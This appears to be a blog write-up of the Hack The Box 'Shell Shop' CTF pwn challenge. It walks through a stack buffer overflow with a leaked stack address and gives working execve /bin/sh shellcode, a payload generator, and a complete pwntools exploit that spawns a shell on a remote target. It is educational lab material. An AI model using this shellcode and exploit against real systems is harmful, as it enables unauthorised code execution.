---
title:  "[CTF] Shell Shop"
categories: [CTF, HTB, Pwn]
---

*You may be talented and skilled, but you need good armor to survive and win this game. Today is your lucky day because the Virtual Shell Shop sells excellent equipment at low prices. Make your purchase now and get a discount coupon for the next event!*

## Understanding the challenge

The challenge comes in the form of an ELF 64-bit binary:

```
$ file shell_shop          
shell_shop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=e3cfb5e3f0b9d17007ce3d49e3ad687365d7c38b, for GNU/Linux 3.2.0, not stripped
```

When run, we’re presented with the following interface:
![Menu](/assets/images/ShellShop/Screenshot 2023-11-05 at 15.33.25.png)

The decompiled applications reveals its internals in Ghidra (interesting variable names have been changed for a quicker understanding):

```
undefined8 main(void)

{
  int option;
 undefined2 overflowVar;
  undefined8 stackVar;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  char local_a;
  char coinsCheck;
  
  setup();
  stackVar = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  overflowVar = 0;
  coinsCheck = '\0';
  local_a = '\0';
  while( true ) {
    while( true ) {
      if (local_a != '\0') {
        if (coinsCheck != '\0') {
 fprintf(stdout,"\nHere is a discount code for your next purchase: [%p]\n",
            &stackVar);
        }
        fwrite("\nDo you want to get notified when the Virtual Shell Shop appears again? (y/n): ",1,
               0x4f,stdout);
 fgets((char *)&overflowVar,100,stdin);
        if (((char)overflowVar == 'y') || ((char)overflowVar == 'Y')) {
          fwrite("\nThank you very much player, you will be notified for the upcoming special events  :D\n\n"
                 ,1,0x56,stdout);
        }
        else {
          fwrite("\nSome events and shops appear randomly, good luck!\n\n",1,0x34,stdout);
        }
        return 0;
      }
      option = shop();
      if (option != 3) break;
      local_a = '\x01';
    }
    if (3 < option) break;
    if (option == 1) {
      check_coins(9999);
    }
    else {
      if (option != 2) break;
      coinsCheck = check_coins(999);
    }
  }
  fprintf(stdout,"%s\n[-] Invalid choice! Exiting..\n\n",&DAT_00102455);
  
  exit(0x16);
}
```

## Vulnerability identification

Before identifying the actual vulnerability, let’s make a few observations:

* A quick string search for `flag.txt` file name doesn’t come up with any results. This, together with the fact that the name of the challenge is Shell Shop, points to the fact that very probably we’ll have to obtain a shell on the box, then read the flag from there.
* The application is compiled without stack canaries and also with the stack executable, so probably we’ll have to deal with some stack-based buffer overflow.
* Another very good hint comes in the form of a discount code. This will come in handy later:
    *  *Here is a discount code for your next purchase: [0x7fffffffdde0]*

We can verify the security controls built into the app quickly using [GEF](https://hugsy.github.io/gef/) (GDB Enhanced Features):
![checksec](/assets/images/ShellShop/Screenshot 2023-11-05 at 16.11.19.png)

Other ways to confirm that the stack is indeed executable are via the [vmmap](https://gef-legacy.readthedocs.io/en/latest/commands/vmmap/) command: 

```
(gdb) vmmap
...
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```

Or using the well-known [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) tool, already present on Kali:

```
$ readelf -a ./shell_shop | grep GNU_STACK -A 1
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE 0x10
```

What do we have so far:

* A leaked address (**_1st gift_**) which is on the stack, which itself is executable.
* A local variable on the stack (renamed here to **overflowVar**) which is 8 bytes but [`fgets`](https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm) function will read 100 characters into it. A clear stack-based buffer overflow.
* Speaking of `fgets`, the function is actually deprecated, meaning that it is obsolete and it is strongly suggested not to use it, because it is dangerous. It is dangerous because the input data can contain `NULL` characters (**_2nd gift_**). Another bonus for us, because we won’t have to worry about NULL bytes, which could create a real problem for our payload, especially for sending 8 bytes addresses which would contain NULL bytes.

## Exploitation

To exploit the app, we first need to find out the position in the 100-bytes buffer where RBP is being overwritten. To do that, first we’ll generate a pattern with GEF and then get the offset of the RBP after the crash inside that buffer:

```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

*Notice based on the decompiled code above that in order to reach the point where the data (which overflows the stack variable) is read, we need to first buy an item, then exit*. 

![Image](/assets/images/ShellShop/Screenshot 2023-11-05 at 16.34.31.png)

We can get the position in the buffer which overwrites the RBP register:

```
gef➤  pattern search aaaaaaha
[+] Searching for '6168616161616161'/'6161616161616861' with period=8
[+] Found at offset 55 (little-endian search) likely
```

While debugging, it’s also handy to set up breakpoints at key locations in our application, like for example towards the end after the RBP has been overwritten, to validate that our payload has been transmitted correctly:

```
gef➤   b *(main+372)
Breakpoint 1 at 0x555555555603
```


***‼️* Important Note 1 - ELF with stdin input**

As a general observation, for a binary expecting user input we can craft it separately as needed, then feed that to the binary either via command line, or inside the debugger, using the `stdin` redirection operator:

```
gef➤  run < payload
Starting program: /mnt/hgfs/CTF-oct-23/pwn_shell_shop/shell_shop < payload
```

The strategy for exploitation will be as follows:

* Buy the second item, then exit and get the leaked address of the stack variable (*'“discount code”*). 
* Create the buffer that will contain a small `NOP` sled. the shellcode and the overwritten RIP.
* We will jump on the stack and continue executing our shellcode from there.
* Use [pwntools](https://docs.pwntools.com/) to calculate on-the-fly the address on the stack containing the shellcode, based on the difference between that and the leaked stack variable.
* We will first try to exploit the app locally in GDB (since stack address won’t be randomised and we can use a static payload) then port the exploit to `pwntools`, in order to be able to connect to the binary remotely. 

Before getting started, we’d need to find a short  Linux x86_64 [execve](https://man7.org/linux/man-pages/man2/execve.2.html) shellcode. Luckily with a quick online search we can find a few that match our conditions, with sizes ranging from 22-24 bytes. Very handy. Once we found one (for example [this one](https://www.exploit-db.com/exploits/46907)), we should test it to make sure it works as expected.

```
// gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode

#include <stdio.h>

int main(int argc, char argv) {

    // Shellcode will be palced on the stack!
    // Compile with execstack flag
    
    unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
     
    void (*payload_ptr)() =  (void(*)())shellcode;

    payload_ptr();
    
    return 0;
}

```

When using the above testing harness, remember to compile it with the [execstack](https://stackoverflow.com/questions/53346274/exactly-what-cases-does-the-gcc-execstack-flag-allow-and-how-does-it-enforce-it) flag, since the shellcode is stored on the stack in a local function variable. 

The following Python script creates a local payload file, that we will feed to the app via GDB:

```
import sys
import struct

# Entry setup (navigate the shop)
read_buf_size = 0x1f
shop  = b''
shop += b'2\x0a' + b'\x00' * (read_buf_size - 2)   # Buy second item
shop += b'3\x0a' + b'\x00' * (read_buf_size - 2)   # Exit and get the leaked address

# Offset where RBP is overwritten
offset = 58

# Spawn /bin/sh
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

buf  = b''

nops = b'\x90' * 10  # Small NOPs sled before the shellcode
buf += nops

buf += shellcode
buf += b'\x41' * (offset - len(nops) - len(shellcode))
buf += struct.pack('<Q', 0x7fffffffdda0 - 2)  # Address of payload on the stack

payload = shop + buf + cmds

with open('payload', 'wb') as f:
    f.write(payload)
```

Notice that we have the address of the payload on the stack hardcoded to `0x7fffffffdda0` - 2 (leaked address - 2). 

***‼️* Important Note 2 - Shellcode length**

The shellcode we’re using simply calls the `execve` syscall. If we’d have opted for other commonly found cleaner shellcode, we could have ended up with a slightly larger size, around 40+ bytes. This would still be within our boundaries (remember we overwrite RBP at offset 55) but it will create another problem. The shellcode could overwrite itself, since it’s executing from the stack and using the stack for various operations:
![Image](/assets/images/ShellShop/Screenshot 2023-11-05 at 17.14.21.png)

Notice the value of RSP and RIP registers. The push instruction will corrupt the code on the stack being executed. To avoid this situation, it’s better to stick with a shellcode as compact as possible.

***‼️* Important Note 3 - pwntools vs stdin input**

When porting our code to `pwntools`, we should provide the correct maximum amount of bytes expected by the `fgets` function call. Otherwise it will hang waiting for more input. So simply append a trailer of NOPs at the end:

```
buf += b'\x42' * (100 - len(buf))  # 100 bytes being read (fgets is waiting ..)
```

***‼️* Important Note 4 - Execute dash but no shell**

We have all the pieces in place, let’s test the shellcode in GDB/GEF:

```
gef➤  r < payload
...
process 2894588 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 2894588) exited normally]
```

The process executes `/usr/bin/dash`, but no interactive shell is being spawned, as we’ve got with our shellcode testing harness. So what gives?

It turns out that the same thing would happen outside GDB as well, and the issue is that the input for our program is redirected, and after spawning the shell, there’s no input and the program simply terminates. The fix to read the flag is straightforward: add a few commands at the end of our buffer that will be executed inside the shell:

```
# Execute some commands in the shell
cmds = b'\x0apwd\x0als -al\x0acat flag.txt'

payload = shop + buf + cmds
```

Now we can execute commands before the shell exits:

```
process 2905441 is executing new program: /usr/bin/dash                                                      
[Thread debugging using libthread_db enabled]                                                                
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                   
/mnt/hgfs/CTF-oct-23/pwn_shell_shop
[Detaching after vfork from child process 2905444]
total 2742
drwxrwxr-x 1 kali dialout     576 Nov  5 12:49 .
drwxr-xr-x 1 kali dialout     288 Nov  5 08:36 ..
-rw-r--r-- 1 kali dialout     827 Nov  5 12:49 create_payload.py
-rw-rw-r-- 1 kali dialout      25 Feb  7  2023 flag.txt
drwxrwxr-x 1 kali dialout     128 Feb  7  2023 glibc
HTB{f4k3_fl4g_4_t35t1ng}
[Inferior 1 (process 2905441) exited normally]
```

Since we got this working inside GDB, let’s port this to `pwntools` to be able to test it remotely as well. The final exploitation script looks as follows:

```
from pwn import *

bin_path = './shell_shop'
e = ELF(bin_path)

# Local process
#io = process(bin_path)

# Local process under GDB
# Break before the fgets() call 
#io = gdb.debug(bin_path, gdbscript = 'b *(main+273)')

# Remote process
io = remote('<IP>', '<PORT>')

read_buf_size = 0x1f

# Buy second item
io.send(b'2\x0a' + b'\x00' * (read_buf_size - 2))

# Exit the shop and get the leaked address
io.send(b'3\x0a' + b'\x00' * (read_buf_size - 2))

recv_buf = io.recvrepeat(5).decode("utf-8")
leak_str = recv_buf.split('0x')[1].split(']')[0]
leak_addr = int(leak_str, base = 16)
print("[*] leaked stack address: 0x%X" % leak_addr)

# Offset where RBP is overwritten
offset = 58

# Spawn /bin/sh
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

buf  = b''

nops = b'\x90' * 10  # Small NOPs sled before the shellcode
buf += nops

buf += shellcode
buf += b'\x41' * (offset - len(nops) - len(shellcode))
buf += struct.pack('<Q', leak_addr - 2)  # Address of payload on the stack
buf += b'\x42' * (100 - len(buf))  # 100 bytes being read (fgets is waiting ..)

# Execute some commands in the shell
cmds = b'\x0apwd\x0als -al\x0acat flag.txt\x0a'
buf += cmds

# Send the BOF payload
io.send(buf)
print(io.recvrepeat(2))
```

## References

[Pwntools tutorial - Debugging](https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md)
[Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)](https://www.exploit-db.com/exploits/46907)
[How to Test a Shellcode](https://rjordaney.is/lectures/test_a_shellcode/)
[fgets() Deprecated and dangerous](http://www.crasseux.com/books/ctutorial/fgets.html)
[Introduction to x64 Linux Binary Exploitation (Part 1)](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef)
[Controlling stack execution protection](https://www.ibm.com/docs/en/linux-on-z?topic=protection-control)
[GDB exiting instead of spawning a shell](https://stackoverflow.com/questions/30972544/gdb-exiting-instead-of-spawning-a-shell)
